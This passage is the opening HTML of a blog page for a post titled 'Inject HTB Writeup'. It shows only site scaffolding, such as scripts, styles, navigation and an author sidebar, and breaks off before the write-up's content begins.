<!DOCTYPE html><html class="transition bg-[var(--page-bg)] md:text-[16px] text-[14px]" data-astro-cid-sckkx6r4 data-isHome=false lang=en style=--configHue:270><head><title>Inject HTB Writeup - Mil4ne</title><meta charset=UTF-8><meta content="Easy Machine" name=description><meta content=Mil4ne name=author><meta content=Mil4ne property=og:site_name><meta content=https://fuwari.vercel.app/posts/inject/ property=og:url><meta content="Inject HTB Writeup - Mil4ne" property=og:title><meta content="Easy Machine" property=og:description><meta content=summary_large_image name=twitter:card><meta content=https://fuwari.vercel.app/posts/inject/ property=twitter:url><meta content="Inject HTB Writeup - Mil4ne" name=twitter:title><meta content="Easy Machine" name=twitter:description><meta content="width=device-width" name=viewport><meta content="Astro v4.11.0" name=generator><link href=/favicon/icon.png rel=icon media="(prefers-color-scheme: dark)" sizes=32x32><script>!function(){switch(localStorage.getItem("theme")||"auto"){case"light":document.documentElement.classList.remove("dark");break;case"dark":document.documentElement.classList.add("dark");break;case"auto":window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")}}()</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Inject HTB Writeup","description":"Easy Machine","keywords":["Linux","Easy"],"author":{"@type":"Person","name":"Mil4ne","url":"https://fuwari.vercel.app/"},"datePublished":"2024-04-01"}</script><link href=https://cdn.staticfile.org/KaTeX/0.16.9/katex.min.css rel=stylesheet crossorigin=anonymous integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV><link href=https://fuwari.vercel.app/rss.xml rel=alternate title=Mil4ne type=application/rss+xml><link href=/_astro/hoisted.aW6J7aTb.css rel=stylesheet><style>#post-container :first-child{animation-delay:calc(var(--content-delay) + 0ms)}#post-container :nth-child(2){animation-delay:calc(var(--content-delay) + 50ms)}#post-container :nth-child(3){animation-delay:calc(var(--content-delay) + .1s)}#post-container :nth-child(4){animation-delay:calc(var(--content-delay) + 175ms)}#post-container :nth-child(5){animation-delay:calc(var(--content-delay) + .25s)}#post-container :nth-child(6){animation-delay:calc(var(--content-delay) + 325ms)}</style><link href=/_astro/_page_.Cqgg-kM5.css rel=stylesheet><link href=/_astro/_page_.DImNEAs0.css rel=stylesheet><link href=/_astro/about.B4ABUC8K.css rel=stylesheet><link href=/_astro/_category_.vxujU0QL.css rel=stylesheet><style>#display-setting.svelte-3akcb9 input[type=range].svelte-3akcb9{-webkit-appearance:none;height:1.5rem;background-image:var(--color-selection-bar);transition:background-image .15s ease-in-out}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb:active{background:#fff9}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;border-width:0;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb:active{background:#fff9}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb:active{background:#fff9}</style><script type=module src=/_astro/hoisted.DaJ843G5.js></script><script type=module src=/_astro/page.3zT6KwRv.js></script></head><body class="transition min-h-screen" data-astro-cid-sckkx6r4 style=--configHue:270><div id=config-carrier data-hue=270></div><div><div class="w-full absolute" id=banner-wrapper style=--configHue:270 data-astro-cid-sckkx6r4><div class="overflow-hidden relative h-full hidden object-center object-cover"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Banner image of the blog" decoding=async height=506 loading=lazy src=/_astro/main.BGOttbhW_CEd3.webp width=506 class="w-full h-full object-cover" style=object-position:center></div></div><div class="relative mx-auto gap-4 grid grid-cols-[17.5rem_auto] grid-rows-[auto_auto_1fr_auto] lg:grid-rows-[auto_1fr_auto] max-w-[var(--page-width)] md:px-4 min-h-screen px-0"><div class="onload-animation col-span-2 grid-rows-1 z-50" id=top-row><div class="transition absolute -top-8 bg-[var(--card-bg)] h-8 left-0 right-0"></div><div class="flex items-center justify-between card-base h-[4.5rem] max-w-[var(--page-width)] mx-auto overflow-visible px-4 rounded-t-none sticky top-0"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-[3.25rem]"><div class="flex items-center flex-row text-[var(--primary)] text-md"><svg data-icon=material-symbols:home-outline-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[1.75rem] mb-1 mr-2"><symbol id=ai:material-symbols:home-outline-rounded><path d="M6 19h3v-5q0-.425.288-.712T10 13h4q.425 0 .713.288T15 14v5h3v-9l-6-4.5L6 10zm-2 0v-9q0-.475.213-.9t.587-.7l6-4.5q.525-.4 1.2-.4t1.2.4l6 4.5q.375.275.588.7T20 10v9q0 .825-.588 1.413T18 21h-4q-.425 0-.712-.288T13 20v-5h-2v5q0 .425-.288.713T10 21H6q-.825 0-1.412-.587T4 19m8-6.75" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:home-outline-rounded></use></svg> Mil4ne</div></a><div class="md:flex hidden"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Home><div class="flex items-center">Home</div></a><a href=/archive/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Archivos><div class="flex items-center">Archivos</div></a><a href=/project/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Proyectos><div class="flex items-center">Proyectos</div></a><a href=/about/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label="Sobre mi"><div class="flex items-center">Sobre mi</div></a></div><div class=flex><style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(self.Astro||(self.Astro={})).load=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:load")),(()=>{var t=Object.defineProperty,e=(e,r,n)=>((e,r,n)=>r in e?t(e,r,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[r]=n)(e,"symbol"!=typeof r?r+"":r,n);{let t={0:t=>s(t),1:t=>n(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(n(t)),5:t=>new Set(n(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t)},r=e=>{let[r,n]=e;return r in t?t[r](n):void 0},n=t=>t.map(r),s=t=>"object"!=typeof t||null===t?t:Object.fromEntries(Object.entries(t).map((([t,e])=>[t,r(e)])));class i extends HTMLElement{constructor(){super(...arguments),e(this,"Component"),e(this,"hydrator"),e(this,"hydrate",(async()=>{var t;if(!this.hydrator||!this.isConnected)return;let e=null==(t=this.parentElement)?void 0:t.closest("astro-island[ssr]");if(e)return void e.addEventListener("astro:hydrate",this.hydrate,{once:!0});let r,n=this.querySelectorAll("astro-slot"),i={},o=this.querySelectorAll("template[data-astro-template]");for(let t of o){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("data-astro-template")||"default"]=t.innerHTML,t.remove())}for(let t of n){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("name")||"default"]=t.innerHTML)}try{r=this.hasAttribute("props")?s(JSON.parse(this.getAttribute("props"))):{}}catch(t){let e=this.getAttribute("component-url")||"<unknown>",r=this.getAttribute("component-export");throw r&&(e+=` (export ${r})`),console.error(`[hydrate] Error parsing props for component ${e}`,this.getAttribute("props"),t),t}await this.hydrator(this)(this.Component,r,i,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))})),e(this,"unmount",(()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))}))}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(this.hasAttribute("await-children")&&"interactive"!==document.readyState&&"complete"!==document.readyState){let t=()=>{document.removeEventListener("DOMContentLoaded",t),e.disconnect(),this.childrenConnectedCallback()},e=new MutationObserver((()=>{var e;(null==(e=this.lastChild)?void 0:e.nodeType)===Node.COMMENT_NODE&&"astro:end"===this.lastChild.nodeValue&&(this.lastChild.remove(),t())}));e.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",t)}else this.childrenConnectedCallback()}async childrenConnectedCallback(){let t=this.getAttribute("before-hydration-url");t&&await import(t),this.start()}async start(){let t=JSON.parse(this.getAttribute("opts")),e=this.getAttribute("client");if(void 0!==Astro[e])try{await Astro[e]((async()=>{let t=this.getAttribute("renderer-url"),[e,{default:r}]=await Promise.all([import(this.getAttribute("component-url")),t?import(t):()=>()=>{}]),n=this.getAttribute("component-export")||"default";if(n.includes(".")){this.Component=e;for(let t of n.split("."))this.Component=this.Component[t]}else this.Component=e[n];return this.hydrator=r,this.hydrate}),t,this)}catch(t){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,t)}else window.addEventListener(`astro:${e}`,(()=>this.start()),{once:!0})}attributeChangedCallback(){this.hydrate()}}e(i,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",i)}})()</script><astro-island await-children="" client=load component-export=default component-url=/_astro/Search.oF6B5C8F.js opts={&quot;name&quot;:&quot;Search&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=GD7F5><div class="rounded-lg items-center bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hidden hover:bg-black/[0.06] lg:flex mr-2 transition-all" id=search-bar><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-[1.25rem] text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 active:w-60 h-full transition-all w-40" placeholder="$ Grep" value=""></div><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 lg:hidden" aria-label="Search Panel" id=search-switch><astro-slot name=search-switch><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class=text-[1.25rem] slot=search-switch><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot></button><div class="absolute float-panel-closed float-panel right-4 left-4 md:left-[unset] md:w-[30rem] p-2 rounded-2xl search-panel shadow-2xl top-20" id=search-panel><div class="flex items-center relative bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hover:bg-black/[0.06] lg:hidden rounded-xl transition-all" id=search-bar-inside><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-[1.25rem] text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 absolute inset-0" placeholder=Search value=""></div></div><template data-astro-template=arrow-icon><svg data-icon=fa6-solid:chevron-right height=1em viewBox="0 0 320 512" width=0.63em class="transition text-[var(--primary)] my-auto text=[0.75rem] translate-x-0.5" slot=arrow-icon><symbol id=ai:fa6-solid:chevron-right><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256L73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:chevron-right></use></svg></template></astro-island><astro-island await-children="" client=load component-export=default component-url=/_astro/LightDarkSwitch.B5A2M5Vx.js opts={&quot;name&quot;:&quot;LightDarkSwitch&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=1l6cYY><div class="relative z-50" role=menu tabindex=-1><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 relative" aria-label="Light/Dark Mode" id=scheme-switch role=menuitem><div class="absolute opacity-0"></div><div class="absolute opacity-0"></div><div class=absolute></div></button><div class="transition absolute -right-2 float-panel-closed hidden lg:block pt-5 top-11" id=light-dark-panel><div class="card-base float-panel p-2"><button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Claro</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Oscuro</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap current-theme-btn">Sistema</button></div></div></div></astro-island><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 md:hidden" aria-label=Menu id=nav-menu-switch name="Nav Menu"><svg data-icon=material-symbols:menu-rounded height=1em viewBox="0 0 24 24" width=1em class=text-[1.25rem]><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></button></div><div class="absolute float-panel-closed float-panel right-4 fixed px-2 py-2 transition-all" id=nav-menu-panel><a href=/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Home</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/archive/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Archivos</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/project/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Proyectos</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/about/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Sobre mi</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg></a></div><script>(self.Astro||(self.Astro={})).only=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:only"))</script><astro-island await-children="" client=only component-export=default component-url=/_astro/DisplaySettings.BbR0fAju.js opts={&quot;name&quot;:&quot;DisplaySettings&quot;,&quot;value&quot;:&quot;svelte&quot;} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=1IwgJN><template data-astro-template=restore-icon><svg data-icon=fa6-solid:arrow-rotate-left height=1em viewBox="0 0 512 512" width=1em class=text-[0.875rem] slot=restore-icon><symbol id=ai:fa6-solid:arrow-rotate-left><path d="M125.7 160H176c17.7 0 32 14.3 32 32s-14.3 32-32 32H48c-17.7 0-32-14.3-32-32V64c0-17.7 14.3-32 32-32s32 14.3 32 32v51.2l17.6-17.6c87.5-87.5 229.3-87.5 316.8 0s87.5 229.3 0 316.8s-229.3 87.5-316.8 0c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0c62.5 62.5 163.8 62.5 226.3 0s62.5-163.8 0-226.3s-163.8-62.5-226.3 0z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:arrow-rotate-left></use></svg></template></astro-island></div><script>!async function(){const i=await import("/pagefind/pagefind.js");await i.options({excerptLength:20}),i.init(),window.pagefind=i,i.search("")}()</script></div><div class="w-full col-span-2 lg:col-span-1 lg:max-w-[17.5rem] lg:row-end-3 lg:row-start-2 onload-animation row-end-4 row-start-3" id=sidebar><div class="flex w-full gap-4 flex-col mb-4"><div class="card-base p-3"><a href=/about/ class="overflow-hidden relative lg:mt-0 mx-auto active:scale-95 block group lg:max-w-none lg:mx-0 max-w-[240px] mb-3 mt-1 rounded-xl" aria-label="Go to About Page"><div class="transition flex items-center justify-center absolute group-active:bg-black/50 group-hover:bg-black/30 h-full pointer-events-none w-full z-50"><svg data-icon=fa6-regular:address-card height=1em viewBox="0 0 576 512" width=1.13em class="transition group-hover:opacity-100 group-hover:scale-100 opacity-0 scale-90 text-5xl text-white"><symbol id=ai:fa6-regular:address-card><path d="M512 80c8.8 0 16 7.2 16 16v320c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V96c0-8.8 7.2-16 16-16zM64 32C28.7 32 0 60.7 0 96v320c0 35.3 28.7 64 64 64h448c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64zm144 224a64 64 0 1 0 0-128a64 64 0 1 0 0 128m-32 32c-44.2 0-80 35.8-80 80c0 8.8 7.2 16 16 16h192c8.8 0 16-7.2 16-16c0-44.2-35.8-80-80-80zm200-144c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-regular:address-card></use></svg></div><div class="overflow-hidden relative h-full lg:mt-0 lg:w-full mx-auto"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Profile Image of the Author" decoding=async height=506 loading=lazy src=/_astro/main.BGOttbhW_CEd3.webp width=506 class="w-full h-full object-cover" style=object-position:center></div></a><div class=px-2><div class="transition font-bold dark:text-neutral-50 mb-1 text-center text-xl">Mil4ne</div><div class="transition mb-2 bg-[var(--primary)] h-1 mx-auto rounded-full w-5"></div><div class="transition text-center mb-2.5 text-neutral-400">#RoadToCBBH</div><div class="flex gap-2 justify-center mb-1"><a href=https://app.hackthebox.com/profile/1022508 class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=HackTheBox rel=me target=_blank><svg data-icon=carbon:cube height=1em viewBox="0 0 32 32" width=1em class=text-[1.5rem]><symbol id=ai:carbon:cube><path d="m28.504 8.136l-12-7a1 1 0 0 0-1.008 0l-12 7A1 1 0 0 0 3 9v14a1 1 0 0 0 .496.864l12 7a1 1 0 0 0 1.008 0l12-7A1 1 0 0 0 29 23V9a1 1 0 0 0-.496-.864M16 3.158L26.016 9L16 14.842L5.984 9ZM5 10.74l10 5.833V28.26L5 22.426Zm12 17.52V16.574l10-5.833v11.685Z" fill=currentColor /></symbol><use xlink:href=#ai:carbon:cube></use></svg> </a><a href=https://linkedin.com/in/mil4ne class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=Linkedin rel=me target=_blank><svg data-icon=carbon:logo-linkedin height=1em viewBox="0 0 32 32" width=1em class=text-[1.5rem]><symbol id=ai:carbon:logo-linkedin><path d="M26.2 4H5.8C4.8 4 4 4.8 4 5.7v20.5c0 .9.8 1.7 1.8 1.7h20.4c1 0 1.8-.8 1.8-1.7V5.7c0-.9-.8-1.7-1.8-1.7M11.1 24.4H7.6V13h3.5zm-1.7-13c-1.1 0-2.1-.9-2.1-2.1s.9-2.1 2.1-2.1c1.1 0 2.1.9 2.1 2.1s-1 2.1-2.1 2.1m15.1 12.9H21v-5.6c0-1.3 0-3.1-1.9-3.1S17 17.1 17 18.5v5.7h-3.5V13h3.3v1.5h.1c.5-.9 1.7-1.9 3.4-1.9c3.6 0 4.3 2.4 4.3 5.5v6.2z" fill=currentColor /></symbol><use xlink:href=#ai:carbon:logo-linkedin></use></svg> </a><a href=https://github.com/mil4ne class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=GitHub rel=me target=_blank><svg data-icon=fa6-brands:github height=1em viewBox="0 0 496 512" width=0.97em class=text-[1.5rem]><symbol id=ai:fa6-brands:github><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6c-3.3.3-5.6-1.3-5.6-3.6c0-2 2.3-3.6 5.2-3.6c3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9c2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9c.3 2 2.9 3.3 5.9 2.6c2.9-.7 4.9-2.6 4.6-4.6c-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2c12.8 2.3 17.3-5.6 17.3-12.1c0-6.2-.3-40.4-.3-61.4c0 0-70 15-84.7-29.8c0 0-11.4-29.1-27.8-36.6c0 0-22.9-15.7 1.6-15.4c0 0 24.9 2 38.6 25.8c21.9 38.6 58.6 27.5 72.9 20.9c2.3-16 8.8-27.1 16-33.7c-55.9-6.2-112.3-14.3-112.3-110.5c0-27.5 7.6-41.3 23.6-58.9c-2.6-6.5-11.1-33.3 2.6-67.9c20.9-6.5 69 27 69 27c20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27c13.7 34.7 5.2 61.4 2.6 67.9c16 17.7 25.8 31.5 25.8 58.9c0 96.5-58.9 104.2-114.8 110.5c9.2 7.9 17 22.9 17 46.4c0 33.7-.3 75.4-.3 83.6c0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252C496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2c1.6 1.6 3.9 2.3 5.2 1c1.3-1 1-3.3-.7-5.2c-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9c1.6 1 3.6.7 4.3-.7c.7-1.3-.3-2.9-2.3-3.9c-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2c2.3 2.3 5.2 2.6 6.5 1c1.3-1.3.7-4.3-1.3-6.2c-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9c1.6 2.3 4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2c-1.4-2.3-4-3.3-5.6-2" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:github></use></svg></a></div></div></div></div><div class="flex w-full gap-4 flex-col top-4 top-4 sticky"><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ucso7hve data-id=categories data-is-collapsed=false style=animation-delay:150ms;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve>Categorias</div><div class="overflow-hidden collapse-wrapper px-4" id=categories style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><a href=/archive/category/HackTheBox/ aria-label="View all posts in the HackTheBox category"><button class="rounded-lg active:bg-[var(--btn-plain-bg-active)] hover:bg-[var(--btn-plain-bg-hover)] bg-none dark:hover:text-[var(--primary)] dark:text-neutral-300 h-10 hover:pl-3 hover:text-[var(--primary)] pl-2 text-neutral-700 transition-all w-full"><div class="flex items-center justify-between mr-2 relative"><div class="overflow-hidden overflow-ellipsis whitespace-nowrap text-left">HackTheBox</div><div class="transition flex items-center rounded-lg bg-[oklch(0.95_0.025_var(--hue))] dark:bg-[var(--primary)] dark:text-[var(--deep-text)] font-bold h-7 justify-center min-w-[2rem] ml-4 text-[var(--btn-content)] text-sm">18</div></div></button></a></div></widget-layout><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ucso7hve data-id=tags data-is-collapsed=false style=animation-delay:.2s;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve>Tags</div><div class="overflow-hidden collapse-wrapper px-4" id=tags style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><div class="flex flex-wrap gap-2"><a href=/archive/tag/Easy/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Easy tag">Easy </a><a href=/archive/tag/Hard/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Hard tag">Hard </a><a href=/archive/tag/Linux/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Linux tag">Linux </a><a href=/archive/tag/Medium/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Medium tag">Medium </a><a href=/archive/tag/Windows/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Windows tag">Windows</a></div></div></widget-layout></div></div><div class="overflow-hidden onload-animation col-span-2 lg:col-span-1 row-end-3 row-start-2" id=content-wrapper><main class=transition-fade id=swup><div class="flex w-full mb-4 overflow-hidden relative rounded-[var(--radius-large)]"><div class="w-full relative card-base md:px-9 pb-4 pt-6 px-6 z-10" id=post-container><div class="transition flex dark:text-white/30 flex-row gap-5 mb-3 onload-animation text-black/30"><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:notes-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:notes-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h10q.425 0 .713.288T15 17t-.288.713T14 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:notes-rounded></use></svg></div><div class=text-sm>1439 Palabras</div></div><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:schedule-outline-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:schedule-outline-rounded><path d="M13 11.6V8q0-.425-.288-.712T12 7t-.712.288T11 8v3.975q0 .2.075.388t.225.337l3.3 3.3q.275.275.7.275T16 16t.275-.7t-.275-.7zM12 22q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22m0-2q3.325 0 5.663-2.337T20 12t-2.337-5.663T12 4T6.337 6.338T4 12t2.338 5.663T12 20" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:schedule-outline-rounded></use></svg></div><div class=text-sm>7 minutos</div></div></div><div class="relative onload-animation"><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-5 before:left-[-1.125rem] before:top-[0.75rem] block dark:text-white/90 mb-3 md:before:w-1 md:text-[2.5rem]/[2.75rem] text-3xl text-black/90 w-full" data-pagefind-body data-pagefind-meta=title data-pagefind-weight=10>Inject HTB Writeup</div></div><div class=onload-animation><div class="flex items-center gap-4 dark:text-neutral-400 flex-wrap gap-x-4 gap-y-2 mb-5 text-neutral-500" data-astro-cid-qtyrxm4s><div class="flex items-center" 